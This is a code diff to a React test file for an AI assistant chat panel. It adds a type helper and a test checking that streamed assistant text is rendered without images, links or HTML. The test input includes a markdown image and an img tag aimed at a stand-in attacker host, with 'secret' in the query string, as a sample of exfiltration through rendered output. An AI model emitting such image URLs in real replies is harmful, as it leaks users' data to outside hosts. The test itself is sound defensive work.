@@ -17,6 +17,9 @@ import { SetupDialog } from "./setup-dialog";
 
 const ok = <T,>(value: T): IpcResult<T> => ({ ok: true, value });
 
+/** An event without its conversation, which the test fills in. */
+type WithoutConversation<T> = T extends unknown ? Omit<T, "conversationId"> : never;
+
 const anthropic: ProviderSetupDto = {
   kind: "anthropic",
   model: "claude-sonnet-4-5",
@@ -76,7 +79,7 @@ function setup(status?: AssistantStatusDto) {
   const registry = createCommandRegistry<AppCommandId>();
   // The shell's command, which the panel's assistant.focus runs.
   registry.register({ id: "view.showAside", title: "Show", category: "View", run: () => {} });
-  const emit = (event: Omit<AssistantEventDto, "conversationId">) =>
+  const emit = (event: WithoutConversation<AssistantEventDto>) =>
     act(() => {
       bus.emit("assistant.event", {
         ...event,
@@ -306,8 +309,14 @@ describe("AssistantPanel", () => {
     await store.refresh();
     render(<AssistantPanel store={store} registry={registry} renderDiff={renderDiff} />);
     await store.send("Docs?");
-    emit({ kind: "text", delta: "See [the docs](https://example.com/docs)." });
+    emit({
+      kind: "text",
+      delta:
+        "See [the docs](https://example.com/docs). ![chart](https://evil.example/c.png?q=secret) <img src=https://evil.example/x.png>",
+    });
     emit({ kind: "done" });
+    // Nothing is fetched or followed: no picture, no link, no HTML.
+    expect(document.querySelector("img")).toBeNull();
     expect(document.querySelector("a[href]")).toBeNull();
     expect(screen.getByText(/the docs/).textContent).toContain("https://example.com/docs");
   });
